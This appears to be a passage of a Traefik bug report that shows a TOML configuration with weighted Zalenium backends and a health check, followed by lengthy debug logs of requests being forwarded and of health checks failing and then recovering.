{"request":"{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"10.0.0.24:8080\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"*[munched]*\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"10.255.0.10:58811\\",\\"requesturi\\":\\"/d/472cea45ee404e22191e52fc6a620d62c06572bcb2b8b0ddef0517ee5a87e426\\",\\"tls\\":null}","traefiklog":"debug","msg":"vulcand/oxy/forward/http: completed servehttp on request","time":"2018-03-20t10:01:30z"}
{"request":"{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"10.0.0.24:8080\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"*[munched]*\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"10.255.0.10:58811\\",\\"requesturi\\":\\"/d/472cea45ee404e22191e52fc6a620d62c06572bcb2b8b0ddef0517ee5a87e426\\",\\"tls\\":null}","traefiklog":"debug","msg":"vulcand/oxy/forward: completed servehttp on request","time":"2018-03-20t10:01:30z"}
``` if you need more information just ask.
### if applicable, please paste the log output in debug mode (`--debug` switch)
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":8080" [file] [frontends] [frontends.zalenium] backend = "zalenium" entrypoints = ["http"] [frontends.zalenium.routes.test1] rule = "host:localhost" [backends] [backends.zalenium] [backends.zalenium.servers.zalenium1] url = " " weight = 10000000 [backends.zalenium.servers.zalenium2] url = " " weight = 0 [backends.zalenium.healthcheck] path = "/wd/hub/status" interval = "5s" ################################################################
# web configuration backend
################################################################ # enable web configuration backend
[web] # web administration port
address = ":8090"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) <details> ```console
$ ~/downloads/traefik_darwin-amd64 --configfile=./traefik.toml -d
info[2018-03-08t18:10:39+01:00] using toml configuration file /users/dennis/netent/repos/traefik/traefik.toml
warn[2018-03-08t18:10:39+01:00] web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics
info[2018-03-08t18:10:39+01:00] traefik version v1.5.3 built on 2018-02-27_02:47:04pm
info[2018-03-08t18:10:39+01:00]
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data debu[2018-03-08t18:10:39+01:00] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":"0s","gracetimeout":"10s"},"gracetimeout":"0s","debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":8080","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"network":"","address":":8090","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":"2s","maxidleconnsperhost":200,"idletimeout":"0s","insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":"30s"},"respondingtimeouts":null,"forwardingtimeouts":null,"web":{"address":":8090","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"/","auth":null,"debug":false},"docker":null,"file":{"watch":true,"filename":"/users/dennis/netent/repos/traefik/traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":""},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":{"entrypoint":"traefik","dashboard":true,"debug":true,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":{"entrypoint":"traefik"}}
info[2018-03-08t18:10:39+01:00] preparing server traefik &{network: address::8090 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-03-08t18:10:39+01:00] preparing server http &{network: address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-03-08t18:10:39+01:00] starting server on :8090
info[2018-03-08t18:10:39+01:00] starting provider *file.provider {"watch":true,"filename":"/users/dennis/netent/repos/traefik/traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":""}
info[2018-03-08t18:10:39+01:00] starting server on :8080
debu[2018-03-08t18:10:39+01:00] validation of load balancer method for backend zalenium failed: invalid load-balancing method ''
using default method wrr.
debu[2018-03-08t18:10:39+01:00] configuration received from provider file: {"backends":{"zalenium":{"servers":{"zalenium1":{"url":" ","weight":10000000},"zalenium2":{"url":" ","weight":1}},"loadbalancer":{"method":"wrr"},"healthcheck":{"path":"/wd/hub/status","interval":"5s"}}},"frontends":{"zalenium":{"entrypoints":["http"],"backend":"zalenium","routes":{"test1":{"rule":"host:localhost"}},"priority":0,"basicauth":null}}}
debu[2018-03-08t18:10:39+01:00] creating frontend zalenium
debu[2018-03-08t18:10:39+01:00] wiring frontend zalenium to entrypoint http
debu[2018-03-08t18:10:39+01:00] creating route test1 host:localhost
debu[2018-03-08t18:10:39+01:00] creating backend zalenium
debu[2018-03-08t18:10:39+01:00] creating load-balancer wrr
debu[2018-03-08t18:10:39+01:00] creating server zalenium1 at with weight 10000000
debu[2018-03-08t18:10:39+01:00] creating server zalenium2 at with weight 1
debu[2018-03-08t18:10:39+01:00] setting up backend health check [path: /wd/hub/status port: 0 interval: 5s]
info[2018-03-08t18:10:39+01:00] server configuration reloaded on :8090
info[2018-03-08t18:10:39+01:00] server configuration reloaded on :8080
debu[2018-03-08t18:10:39+01:00] initial healthcheck for currentbackend httpzalenium
debu[2018-03-08t18:10:44+01:00] refreshing healthcheck for currentbackend httpzalenium
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59188","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59188","requesturi":"/","tls":null}" forwardurl=
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59188","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59188","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 18.657ms
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59188","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59188","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:48+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59188","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:49+01:00] refreshing healthcheck for currentbackend httpzalenium
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59191","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url forwardurl= request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59191","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59191","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59191","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 29.623ms
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59191","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59191","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:50+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59191","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59193","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59193","requesturi":"/","tls":null}" forwardurl=
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59193","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59193","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 9.48ms
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59193","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59193","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:52+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59193","requesturi":"/","tls":null}"
debu[2018-03-08t18:10:54+01:00] refreshing healthcheck for currentbackend httpzalenium
debu[2018-03-08t18:10:59+01:00] refreshing healthcheck for currentbackend httpzalenium
debu[2018-03-08t18:11:04+01:00] refreshing healthcheck for currentbackend httpzalenium
warn[2018-03-08t18:11:04+01:00] healthcheck has failed [ remove from server list
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59200","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url forwardurl= request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59200","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59200","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59200","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 22.647ms
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59200","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59200","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:06+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59200","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59202","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59202","requesturi":"/","tls":null}" forwardurl=
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59202","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59202","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 13.982ms
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59202","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59202","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:08+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59202","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:09+01:00] refreshing healthcheck for currentbackend httpzalenium
warn[2018-03-08t18:11:09+01:00] healthcheck is still failing [
debu[2018-03-08t18:11:14+01:00] refreshing healthcheck for currentbackend httpzalenium
warn[2018-03-08t18:11:14+01:00] healthcheck is still failing [
debu[2018-03-08t18:11:19+01:00] refreshing healthcheck for currentbackend httpzalenium
warn[2018-03-08t18:11:19+01:00] healthcheck is still failing [
debu[2018-03-08t18:11:24+01:00] refreshing healthcheck for currentbackend httpzalenium
warn[2018-03-08t18:11:24+01:00] healthcheck is still failing [
debu[2018-03-08t18:11:29+01:00] refreshing healthcheck for currentbackend httpzalenium
warn[2018-03-08t18:11:29+01:00] healthcheck is still failing [
debu[2018-03-08t18:11:34+01:00] refreshing healthcheck for currentbackend httpzalenium
warn[2018-03-08t18:11:34+01:00] healthcheck is still failing [
debu[2018-03-08t18:11:39+01:00] refreshing healthcheck for currentbackend httpzalenium
debu[2018-03-08t18:11:39+01:00] healthcheck is up [ upsert in server list
debu[2018-03-08t18:11:42+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59217","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:42+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59217","requesturi":"/","tls":null}" forwardurl=
debu[2018-03-08t18:11:42+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59217","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:42+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59217","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:42+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 24.741ms
debu[2018-03-08t18:11:42+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59217","requesturi":"/","tls":null}"
